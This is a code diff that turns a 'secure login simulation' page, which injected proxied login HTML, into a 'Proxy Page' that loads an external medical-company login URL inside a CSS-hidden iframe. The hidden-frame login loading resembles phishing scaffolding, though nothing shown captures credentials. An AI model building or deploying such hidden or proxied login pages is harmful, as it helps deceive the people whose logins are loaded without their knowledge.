@@ -1,18 +1,19 @@
 <!DOCTYPE html>
-<html>
-<head><title>Secure_Login</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Proxy Page</title>
+  <style>
+    iframe {
+      display: none; /* Hide the iframe */
+    }
+  </style>
+</head>
 <body>
-  <h1>Demo: Secure Login Simulation</h1>
-  <div id="app">Loading login form...</div>
+  <iframe src="https://login.acceleratedmedicallinc.org/?auth=2&login_hint="></iframe>
   <script>
-    fetch('/api/proxy/')
-      .then(res => res.text())
-      .then(html => {
-        document.getElementById('app').innerHTML = html;
-      })
-      .catch(err => {
-        document.getElementById('app').textContent = 'Error loading login: ' + err;
-      });
+    // You can add any additional JavaScript here if needed
   </script>
 </body>
 </html>
